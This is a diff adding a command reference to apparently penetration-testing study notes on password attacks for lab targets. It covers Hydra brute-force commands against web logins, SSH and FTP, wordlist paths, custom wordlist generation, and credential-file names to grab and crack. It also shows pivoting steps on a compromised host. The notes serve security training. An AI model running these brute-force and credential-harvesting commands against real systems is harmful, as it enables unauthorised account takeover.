@@ -82,6 +82,49 @@ Generic login errors (no user enum), rate limiting + lockout (server-side, not p
 ## My notes / lab output
 Filled in as I run these on lab targets.
 
+## Full command reference (source notes)
+Complete command set — nothing trimmed.
+
+**Hash-bearing files** (grab + crack offline)
+| Windows | Linux |
+|---|---|
+| `unattend.xml`, `sysprep.inf`, `SAM` | `shadow`, `shadow.bak`, `password` / `passwd` |
+
+**Hydra**
+| Command | Description |
+|---|---|
+| `hydra -h` | Help |
+| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Basic Auth brute, combined list |
+| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Basic Auth, user/pass lists |
+| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login form, static user |
+| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH, user/pass lists |
+| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP, static user |
+| `hydra -l b.gates -P william.txt ssh://<ip>:<port>` | SSH brute a specific user |
+| `hydra -L names.txt -P rockyou-10.txt -f <ip> -s <port> http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login form, default passwords |
+
+**Wordlists**
+| Path | Description |
+|---|---|
+| `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default passwords |
+| `/usr/share/wordlists/rockyou.txt` | Most common passwords |
+| `/usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt` | rockyou-10 (92 entries, fast first pass) |
+| `/usr/share/seclists/Usernames/Names/names.txt` | Common names |
+
+**Personalized wordlists & follow-up**
+| Command | Description |
+|---|---|
+| `cupp -i` | Build a custom password list interactively |
+| `sed -ri '/^.{,7}$/d' william.txt` | Remove passwords shorter than 8 |
+| `sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt` | Remove passwords with no special chars |
+| `sed -ri '/[0-9]+/!d' william.txt` | Remove passwords with no numbers |
+| `./username-anarchy Bill Gates > bill.txt` | Generate a usernames list |
+| `ssh b.gates@SERVER_IP -p PORT` | SSH to the server |
+| `ftp 127.0.0.1` | FTP to the server (internal) |
+| `su - user` | Switch user with a found password |
+| `netstat -antp \| grep -i list` | Find internal listening services |
+| `scp -P 53718 ./william.txt b.gates@<ip>:/tmp` | Copy wordlist to the target |
+| `hydra -l m.gates -P /tmp/william.txt ftp://127.0.0.1` | Run hydra on the victim vs internal FTP |
+
 ## 2. Setup
 - Attack box: (Pwnbox / Kali VM)
 - Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)
